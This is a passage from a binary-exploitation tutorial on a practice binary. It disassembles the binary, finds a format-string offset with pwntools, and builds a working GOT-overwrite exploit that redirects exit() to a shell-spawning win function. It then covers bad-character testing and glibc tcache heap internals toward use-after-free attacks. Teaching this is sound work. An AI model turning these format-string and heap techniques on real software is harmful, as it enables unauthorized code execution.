</span></span><span style="display:flex;"><span>   0x00000000004011bb &lt;+5&gt;:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>   0x00000000004011be &lt;+8&gt;:	lea    rdi,<span style="color:#f92672">[</span>rip+0xe3f<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x402004</span>
</span></span><span style="display:flex;"><span>   0x00000000004011c5 &lt;+15&gt;:	call   0x401080 &lt;puts@plt&gt;
</span></span><span style="display:flex;"><span>   0x00000000004011ca &lt;+20&gt;:	mov    r8d,0x0
</span></span><span style="display:flex;"><span>   0x00000000004011d0 &lt;+26&gt;:	lea    rcx,<span style="color:#f92672">[</span>rip+0xe45<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x40201c</span>
</span></span><span style="display:flex;"><span>   0x00000000004011d7 &lt;+33&gt;:	lea    rdx,<span style="color:#f92672">[</span>rip+0xe46<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x402024</span>
</span></span><span style="display:flex;"><span>   0x00000000004011de &lt;+40&gt;:	lea    rsi,<span style="color:#f92672">[</span>rip+0xe42<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x402027</span>
</span></span><span style="display:flex;"><span>   0x00000000004011e5 &lt;+47&gt;:	lea    rdi,<span style="color:#f92672">[</span>rip+0xe30<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x40201c</span>
</span></span><span style="display:flex;"><span>   0x00000000004011ec &lt;+54&gt;:	mov    eax,0x0
</span></span><span style="display:flex;"><span>   0x00000000004011f1 &lt;+59&gt;:	call   0x4010c0 &lt;execl@plt&gt;
</span></span><span style="display:flex;"><span>   0x00000000004011f6 &lt;+64&gt;:	nop
</span></span><span style="display:flex;"><span>   0x00000000004011f7 &lt;+65&gt;:	pop    rbp
</span></span><span style="display:flex;"><span>   0x00000000004011f8 &lt;+66&gt;:	ret
</span></span><span style="display:flex;"><span>End of assembler dump.
</span></span></code></pre></div><p>We can see its executing something using <code>execl@plt</code>. Lets examine <code>rdi</code> register <code>0x40201c</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; x/s 0x40201c
</span></span><span style="display:flex;"><span>0x40201c:	<span style="color:#e6db74">&#34;/bin/sh&#34;</span>
</span></span></code></pre></div><p>Its calling <code>/bin/sh</code>, this is mostly a <code>ret2win</code> like challenge where we need to call <code>win</code> function and that will spawn us a shell. If we disassemble main function we can see its not calling win function anywhere so we have to manually call it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; disass main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
</span></span><span style="display:flex;"><span>   0x00000000004011f9 &lt;+0&gt;:	endbr64
</span></span><span style="display:flex;"><span>   0x00000000004011fd &lt;+4&gt;:	push   rbp
</span></span><span style="display:flex;"><span>   0x00000000004011fe &lt;+5&gt;:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>   0x0000000000401201 &lt;+8&gt;:	sub    rsp,0x40
</span></span><span style="display:flex;"><span>   0x0000000000401205 &lt;+12&gt;:	mov    rax,QWORD PTR fs:0x28
</span></span><span style="display:flex;"><span>   0x000000000040120e &lt;+21&gt;:	mov    QWORD PTR <span style="color:#f92672">[</span>rbp-0x8<span style="color:#f92672">]</span>,rax
</span></span><span style="display:flex;"><span>   0x0000000000401212 &lt;+25&gt;:	xor    eax,eax
</span></span><span style="display:flex;"><span>   0x0000000000401214 &lt;+27&gt;:	lea    rdi,<span style="color:#f92672">[</span>rip+0xe0f<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x40202a</span>
</span></span><span style="display:flex;"><span>   0x000000000040121b &lt;+34&gt;:	mov    eax,0x0
</span></span><span style="display:flex;"><span>   0x0000000000401220 &lt;+39&gt;:	call   0x401090 &lt;printf@plt&gt;
</span></span><span style="display:flex;"><span>   0x0000000000401225 &lt;+44&gt;:	lea    rax,<span style="color:#f92672">[</span>rbp-0x40<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>   0x0000000000401229 &lt;+48&gt;:	mov    rsi,rax
</span></span><span style="display:flex;"><span>   0x000000000040122c &lt;+51&gt;:	lea    rdi,<span style="color:#f92672">[</span>rip+0xe07<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x40203a</span>
</span></span><span style="display:flex;"><span>   0x0000000000401233 &lt;+58&gt;:	mov    eax,0x0
</span></span><span style="display:flex;"><span>   0x0000000000401238 &lt;+63&gt;:	call   0x4010a0 &lt;__isoc99_scanf@plt&gt;
</span></span><span style="display:flex;"><span>   0x000000000040123d &lt;+68&gt;:	lea    rax,<span style="color:#f92672">[</span>rbp-0x40<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>   0x0000000000401241 &lt;+72&gt;:	mov    rdi,rax
</span></span><span style="display:flex;"><span>   0x0000000000401244 &lt;+75&gt;:	mov    eax,0x0
</span></span><span style="display:flex;"><span>   0x0000000000401249 &lt;+80&gt;:	call   0x401090 &lt;printf@plt&gt;
</span></span><span style="display:flex;"><span>   0x000000000040124e &lt;+85&gt;:	mov    edi,0x0
</span></span><span style="display:flex;"><span>   0x0000000000401253 &lt;+90&gt;:	call   0x4010b0 &lt;exit@plt&gt;
</span></span></code></pre></div><p>We know <code>GOT</code> table has address of different functions here and If we can somehow change <code>exit@plt</code> address from GOT table and write <code>win</code> function GOT table address, instruction call will call to <code>exit</code> function on GOT table and ask <code>give me address of exit function</code> but GOT table will give address of our <code>win</code> function and we can spawn a shell which is <code>GOT Overwrite</code> Attack.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./fmt_got
</span></span><span style="display:flex;"><span>Enter String - %p
</span></span><span style="display:flex;"><span>0xa      
</span></span></code></pre></div><p>As we can see its vulnerable to format string attack. As always first lets find offset or position on where our input is stored in stack.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">50</span>):
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./fmt_got&#39;</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;AAAAAAAA%</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">$p&#39;</span>
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>    print(io<span style="color:#f92672">.</span>recvall(),i)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>close()
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ python3 main.py
</span></span><span style="display:flex;"><span>/home/at0m/main.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
</span></span><span style="display:flex;"><span>  io.sendline<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter String - AAAAAAAA0x4141414141414141&#39;</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>We got our offset or position at <code>6</code> So we have to write at 7th position because 6 is our current input.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf  <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./fmt_got&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./fmt_got&#39;</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%7$n&#39;</span> <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>exit)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>In previous challenge we had to write <code>3</code> in 9th position of stack that&rsquo;s why we wrote <code>ABC%9$nD</code> but this time we have to write address of <code>win</code> function that&rsquo;s why we have to find <code>win</code> function address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ‚ùØ nm ./fmt_got                     
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>00000000004011b6 T win
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>First lets unhex the address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ python3
</span></span><span style="display:flex;"><span>Python 3.12.3 <span style="color:#f92672">(</span>main, Feb  <span style="color:#ae81ff">4</span> 2025, 14:48:35<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>GCC 13.3.0<span style="color:#f92672">]</span> on linux
</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> or <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information.
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; 0x00000000004011b6
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4198838</span>
</span></span></code></pre></div><p>So we will need to write <code>4198838</code> in stack. If there was no limit on input that we could give then we could normally write our exploit like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf  <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./fmt_got&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./fmt_got&#39;</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4198838</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;%7$n&#39;</span> <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>exit)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>This would first read <code>'A'*4198838</code> which would be <code>4198838</code>&rsquo;s of A and write <code>4198838</code> on stack (exit function) but in our case we have limited input so this method won&rsquo;t work. Instead we could write like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf  <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./fmt_got&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./fmt_got&#39;</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%4198838x</span><span style="color:#e6db74">%7$n&#39;</span> <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>exit)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>In this <code>'%4198838x%7$n</code>. <code>%x</code> will print first <code>4198838</code> character then <code>%7$n</code> will write this value (4198838) into the memory address provided as the 7th argument on the stack. The <code>pack(elf.got.exit)</code> appends the address of the <code>exit()</code> GOT entry in a packed (little-endian) format, placing it on the stack. Together, this causes <code>printf()</code> to overwrite the <code>exit()</code> GOT entry with the address of <code>win()</code>, so when <code>exit()</code> is called later, the program instead jumps to <code>win()</code> and spawns a shell.</p>
<p>The format string exploit has an alignment issue we need to resolve. The original payload¬†<code>%4198838x%7$n</code>¬†is 13 bytes long, which doesn&rsquo;t align properly with the 8-byte stack boundaries on a 64-bit system. Since we can&rsquo;t have partial stack entries, we add 3 padding bytes (<code>AAA</code>) to extend it to 16 bytes - a clean multiple of 8. This adjustment changes how our input is positioned on the stack. Our input starts at the 6th position, with the first 8 bytes containing most of our format string. The next 8 bytes contain the remainder of our exploit. Because we&rsquo;ve now used two 8-byte stack slots (positions 6 and 7), the address we want to overwrite (<code>exit@got</code>) moves to the 8th position. This is why we change the format specifier from¬†<code>%7$n</code>¬†to¬†<code>%8$n</code>¬†- it now correctly points to where our target address is stored in the stack. While this padding makes the exploit slightly less elegant, it ensures proper stack alignment for reliable memory overwrites. Here is final exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf  <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./fmt_got&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./fmt_got&#39;</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%4198838x</span><span style="color:#e6db74">%8$nAAA&#39;</span> <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>exit)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="0x12---bad-characters">0x12 - Bad Characters</h2>
<p>In binary exploitation, <strong>bad characters</strong> (also called <strong>bad bytes</strong>) are specific byte values that <strong>must not appear in your payload</strong>, shellcode, or input. These characters are typically <strong>filtered</strong>, <strong>interpreted incorrectly</strong>, or <strong>cause input truncation</strong>, which can break the exploit. Here are some often occuring bad characters:</p>
<ul>
<li><code>\x00</code>¬†- Null Byte</li>
<li><code>\x0A</code>¬†- Line Feed</li>
<li><code>\x0D</code>¬†- Carriage Return</li>
<li><code>\xFF</code>¬†- Form Feed</li>
</ul>
<p>We can test by sending all possible byte values (<code>\x00</code> to <code>\xff</code>) to a vulnerable buffer, and then inspect the memory to see which ones got altered, removed, or truncated.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>CHARS<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#34;</span>
</span></span></code></pre></div><p>Example if you want to <strong>examine the memory region</strong> where your <code>badchars</code> landed. Suppose the payload lands on the stack check near <code>$rsp</code> (for 64-bit) or <code>$esp</code> (for 32-bit):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> run <span style="color:#66d9ef">$(</span>python3 -c <span style="color:#e6db74">&#39;print(&#34;\x00\x01\x02...&#34;)&#39;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># for 64-bit</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/256bx $rsp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># for 32-bit</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/256bx $esp
</span></span></code></pre></div><p>This prints 256 bytes in hex format. Look for the clean sequence:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x7fffffffe2a0:  0x00 0x01 0x02 0x03 0x04 0x05 0x06 ...
</span></span></code></pre></div><ul>
<li>If any byte is <strong>missing</strong>, <strong>repeated</strong>, or <strong>truncated</strong>, it‚Äôs a <strong>bad character</strong>.</li>
<li>If it <strong>stops early</strong> (e.g., at <code>\x0a</code>), that means that byte breaks your input and it is bad character.</li>
</ul>
<h2 id="0x13---understanding-heap">0x13 - Understanding Heap</h2>
<p>The <strong>heap</strong> is a region of memory used for dynamic allocation during a program‚Äôs runtime. When a program requests memory using functions like <code>malloc</code> or <code>new</code>, this memory is allocated from the heap. Unlike the stack, which grows and shrinks automatically with function calls and returns, the heap allows more flexible memory management, but it also requires the programmer (or runtime) to manually allocate and free memory. The heap is typically located at a higher memory address than the program‚Äôs code or data segments and grows upward. In exploitation, leaking a heap address can help bypass protections like ASLR (Address Space Layout Randomization) and is particularly useful in heap-based attacks such as use-after-free or heap overflow vulnerabilities.</p>
<p>Unless programmer calls heap, data will be stored in stack and it is simpler compared to stack. The borrowed storage from heap is called <strong>chunk</strong> and remaining part is called as <strong>Top Chunk</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Ask for 20 bytes of memory from the heap
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">20</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Check if allocation was successful
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (ptr <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Memory allocation failed!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Use the allocated memory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">sprintf</span>(ptr, <span style="color:#e6db74">&#34;Hello, heap!&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ptr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Free the memory when done
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">free</span>(ptr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>A process has limited heap and when it is finished kernel will give more if you ask.</p>
<p>There is rule of <code>malloc</code> that whether you ask for any byte it will give you minimum of <code>32</code> bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">1</span>);
</span></span></code></pre></div><p>We‚Äôre asking for <strong>1 byte</strong>, but <strong>malloc</strong> will often give us <strong>more than that</strong>  typically <strong>at least 16 or 32 bytes</strong>, depending on the <strong>platform</strong>, <strong>architecture</strong>, and the <strong>malloc implementation</strong> (like <code>glibc</code> on Linux).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>malloc(1) --&gt; Checks Tcache - If not in Tcache -&gt; Checks Other Bins - If not in Other Bins -&gt; Cuts Top Chunk  
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">free</span>(ptr);
</span></span></code></pre></div><p><code>free</code> functions will frees up memory and it will put it under heap cache which is called <strong>Tcache</strong> for later use. It is just location where it stores address of free chunk.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>free(a) --&gt; Use Tcache - If not in Tcache -&gt; Use Other Bins  
</span></span></code></pre></div><p>Now imagine if we do:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">free</span>(ptr2);
</span></span></code></pre></div><p>Now, here‚Äôs where it gets interesting: if you free another pointer, say <code>free(ptr2)</code>, the allocator will update the Tcache by inserting the new free chunk&rsquo;s address. This new address can overwrite or chain over the previous one‚Äôs spot in the Tcache list. Because Tcache operates like a singly linked list, each freed chunk holds a pointer to the next free chunk in its memory. This behavior is critical in heap exploitation, where carefully manipulating the order and contents of the Tcache can lead to powerful vulnerabilities like use-after-free or double-free attacks.</p>
<p>The <strong>Tcache freelist</strong> for each size class can hold up to <strong>7 chunks by default</strong> in <code>glibc</code> (this can sometimes be changed, but 7 is typical). That means when you free memory, it can store up to 7 freed chunks of the same size in Tcache before returning chunks to the global heap. This is why heap is memory efficient.</p>
<p><img src="/img/heap.png" alt="heap.png"></p>
<p>FD Pointer means Forward Pointer. If we can change FD Pointer to our address, Imagine if we change to GOT address when doing <code>malloc</code> Tcache will give us chunk which is main part of exploitation.</p>
<h2 id="0x14----use-after-free-vulnerability-tcache">0x14 -  Use After Free Vulnerability Tcache</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MALLOC &#34;1&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FREE &#34;2&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define LIST &#34;4&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define EDIT &#34;3&#34;
